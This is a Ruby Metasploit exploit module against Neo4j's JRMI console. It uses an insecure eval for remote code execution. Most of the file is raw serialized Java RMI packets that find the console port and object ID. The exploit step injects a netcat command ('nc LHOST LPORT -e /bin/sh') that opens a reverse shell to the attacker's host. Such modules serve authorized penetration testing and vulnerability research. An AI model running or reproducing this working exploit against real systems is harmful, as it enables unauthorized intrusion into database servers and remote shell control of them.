##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Neo4j jrmi console eval',
      'Description'  => %q{
          This module exploit an insecure eval in Neo4j jrmi console. This module
          has been tested successfully on Neo4j 2.0.1 Debian Squeeze.
      },
      'Author'         =>
        [
          'agix' # @agixid # Vulnerability discovery and Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/' ]
        ],
      'Platform'       => %w{ linux win },
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'generic/shell_reverse_tcp'
        },
      'Arch'        => ARCH_CMD,
      'Targets'        =>
        [
          [ 'Automatic',  { } ]
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Apr 24 2014',
      'License'      => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(1337)
      ], self.class)
  end

  def find_console_port
    connect
    packet = "JRMI\x00\x02\x4b"

    sock.put(packet)
    sock.get_once

    packet = "\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x00\x85\xb0"
    sock.put(packet)

    packet =  "\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00"
    packet << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    packet << "\x00\x00\x02\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x05\x73"
    packet << "\x68\x65\x6c\x6c"
    sock.put(packet)

    str = sock.get_once

    end_packet = str[8..8+13]

    rmi_port = str.split("UnicastRef")[1].split("\x00\x00")[1][0..1].unpack("n")[0]
    object_id = str.split("UnicastRef")[1].split("\x00\x00",2)[1][2..2+20]

    sock.put("\x52")
    sock.get_once
    sock.put("\x54" + end_packet)
    disconnect

    return rmi_port, object_id
  end

  def exec_cmd(object_id, port, neo4j_cmd)
    connect(true, { 'RPORT' => port })

    packet = "JRMI\x00\x02\x4b"
    sock.put(packet)
    sock.get_once

    packet = "\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x00\x85\xb0"
    sock.put(packet)

    packet =  "\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x02"
    packet << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    packet << "\x00\x00\x01\xf6\xb6\x89\x8d\x8b\xf2\x86\x43\x75\x72\x00\x18"
    packet << "\x5b\x4c\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76"
    packet << "\x65\x72\x2e\x4f\x62\x6a\x49\x44\x3b\x87\x13\x00\xb8\xd0\x2c"
    packet << "\x64\x7e\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x73\x72\x00"
    packet << "\x15\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65"
    packet << "\x72\x2e\x4f\x62\x6a\x49\x44\xa7\x5e\xfa\x12\x8d\xdc\xe5\x5c"
    packet << "\x02\x00\x02\x4a\x00\x06\x6f\x62\x6a\x4e\x75\x6d\x4c\x00\x05"
    packet << "\x73\x70\x61\x63\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x72"
    packet << "\x6d\x69\x2f\x73\x65\x72\x76\x65\x72\x2f\x55\x49\x44\x3b\x70"
    packet << "\x78\x70" + object_id[0..7] + "\x73\x72\x00\x13\x6a\x61\x76"
    packet << "\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76\x65\x72\x2e\x55\x49"
    packet << "\x44\x0f\x12\x70\x0d\xbf\x36\x4f\x12\x02\x00\x03\x53\x00\x05"
    packet << "\x63\x6f\x75\x6e\x74\x4a\x00\x04\x74\x69\x6d\x65\x49\x00\x06"
    packet << "\x75\x6e\x69\x71\x75\x65\x70\x78\x70\x80\x01\x00\x00\x01\x44"
    packet << "\x27\x04\xed\x73\xd9\x78\x65\x4c\x77\x08\x80\x00\x00\x00\x00"
    packet << "\x00\x00\x00\x73\x72\x00\x12\x6a\x61\x76\x61\x2e\x72\x6d\x69"
    packet << "\x2e\x64\x67\x63\x2e\x4c\x65\x61\x73\x65\xb0\xb5\xe2\x66\x0c"
    packet << "\x4a\xdc\x34\x02\x00\x02\x4a\x00\x05\x76\x61\x6c\x75\x65\x4c"
    packet << "\x00\x04\x76\x6d\x69\x64\x74\x00\x13\x4c\x6a\x61\x76\x61\x2f"
    packet << "\x72\x6d\x69\x2f\x64\x67\x63\x2f\x56\x4d\x49\x44\x3b\x70\x78"
    packet << "\x70\x00\x00\x00\x00\x00\x09\x27\xc0\x73\x72\x00\x11\x6a\x61"
    packet << "\x76\x61\x2e\x72\x6d\x69\x2e\x64\x67\x63\x2e\x56\x4d\x49\x44"
    packet << "\xf8\x86\x5b\xaf\xa4\xa5\x6d\xb6\x02\x00\x02\x5b\x00\x04\x61"
    packet << "\x64\x64\x72\x74\x00\x02\x5b\x42\x4c\x00\x03\x75\x69\x64\x71"
    packet << "\x00\x7e\x00\x03\x70\x78\x70\x75\x72\x00\x02\x5b\x42\xac\xf3"
    packet << "\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x70\x78\x70\x00\x00\x00"
    packet << "\x08\x37\x9d\xdb\x2a\x97\x49\x82\x0d\x73\x71\x00\x7e\x00\x05"
    packet << "\x80\x02\x00\x00\x01\x44\x27\x1e\x09\x8a\x1e\x7d\x0b\xe8"

    sock.put(packet)
    sock.get_once

    sock.put("\x52")
    sock.get_once

    packet =  "\x50\xac\xed\x00\x05\x77\x22" + object_id + "\x01\xff\xff\xff"
    packet << "\xff\x86\x52\x7d\x92\x21\xcf\x5b\x3f\x73\x72\x00\x11\x6a\x61"
    packet << "\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70"
    packet << "\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c"
    packet << "\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72"
    packet << "\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00"
    packet << "\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x74\x00\x05"
    packet << "\x71\x75\x69\x65\x74\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c"
    packet << "\x61\x6e\x67\x2e\x42\x6f\x6f\x6c\x65\x61\x6e\xcd\x20\x72\x80"
    packet << "\xd5\x9c\xfa\xee\x02\x00\x01\x5a\x00\x05\x76\x61\x6c\x75\x65"
    packet << "\x70\x78\x70\x01\x78"

    sock.put(packet)
    str = sock.get_once
    mini_id = str.split('pxp')[-1][0..3]

    packet =  "\x50\xac\xed\x00\x05\x77\x22" + object_id + "\x01\xff\xff\xff"
    packet << "\xff\x57\xaa\xfb\x80\x74\x5d\x90\x46"

    sock.put(packet)
    sock.get_once

    packet =  "\x50\xac\xed\x00\x05\x77\x22" + object_id + "\x01\xff\xff\xff"
    packet << "\xff\x5d\x75\xd4\x42\x46\x34\x86\xd8\x73\x72\x00\x11\x6a\x61"
    packet << "\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72"
    packet << "\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76"
    packet << "\x61\x6c\x75\x65\x70\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c"
    packet << "\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b"
    packet << "\x94\xe0\x8b\x02\x00\x00\x70\x78\x70" + mini_id + "\x74"

    packet << [neo4j_cmd.length].pack('n') + neo4j_cmd

    packet << "\x73\x7d\x00\x00\x00\x02\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d"
    packet << "\x69\x2e\x52\x65\x6d\x6f\x74\x65\x00\x16\x6f\x72\x67\x2e\x6e"
    packet << "\x65\x6f\x34\x6a\x2e\x73\x68\x65\x6c\x6c\x2e\x4f\x75\x74\x70"
    packet << "\x75\x74\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e"
    packet << "\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79"
    packet << "\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68"
    packet << "\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72"
    packet << "\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69"
    packet << "\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72"
    packet << "\x00\x2d\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72\x76"
    packet << "\x65\x72\x2e\x52\x65\x6d\x6f\x74\x65\x4f\x62\x6a\x65\x63\x74"
    packet << "\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c"
    packet << "\x65\x72\x00\x00\x00\x00\x00\x00\x00\x02\x02\x00\x00\x70\x78"
    packet << "\x72\x00\x1c\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x73\x65\x72"
    packet << "\x76\x65\x72\x2e\x52\x65\x6d\x6f\x74\x65\x4f\x62\x6a\x65\x63"
    packet << "\x74\xd3\x61\xb4\x91\x0c\x61\x33\x1e\x03\x00\x00\x70\x78\x70"
    packet << "\x77\x36\x00\x0a\x55\x6e\x69\x63\x61\x73\x74\x52\x65\x66\x00"
    packet << "\x0d\x31\x39\x32\x2e\x31\x36\x38\x2e\x37\x39\x2e\x31\x30\x00"
    packet << "\x00\xa6\x47\x15\x5c\xd2\x0b\x48\x55\x5c\x0a\x49\x9d\x30\xd5"
    packet << "\x00\x00\x01\x44\x2a\x6e\x37\xb5\x80\x01\x00\x78"

    sock.put(packet)

    disconnect
  end

  def exploit
    rmi_port, object_id = find_console_port
    print_status("Let's connect to #{datastore['RHOST']} : #{rmi_port.to_s}")
    exec_cmd(object_id, rmi_port,
      "eval java.lang.Runtime.getRuntime().exec(\"nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh\")"
      )
  end
end

